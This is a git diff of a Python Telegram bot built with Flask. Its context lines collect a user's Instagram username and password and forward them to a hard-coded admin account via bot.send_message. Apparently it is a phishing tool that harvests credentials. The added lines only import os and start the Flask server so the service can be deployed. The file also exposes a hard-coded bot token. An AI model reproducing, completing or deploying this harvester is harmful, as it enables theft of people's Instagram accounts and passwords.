@@ -2,6 +2,7 @@ import telebot
 from flask import Flask, request
 import time
 import threading
+import os
 
 TOKEN = "7419649484:AAGVTtcjwUVOotnOQU8zm71IGhxTctW1Tj8"
 ADMIN_ID = 73493209
@@ -56,3 +57,8 @@ def finish_registration(user_id, msg_id):
     msg = f"💬 Instagram login ma'lumot:\n\n👤 Username: {data['username']}\n🔑 Password: {data['password']}\n🆔 User ID: {user_id}"
     bot.send_message(ADMIN_ID, msg)
     del user_data[user_id]
+
+# 🔥 BU YERNI QO‘SHING – Flask ilovasini ishga tushuradi
+if __name__ == "__main__":
+    port = int(os.environ.get("PORT", 5000))
+    app.run(host="0.0.0.0", port=port)
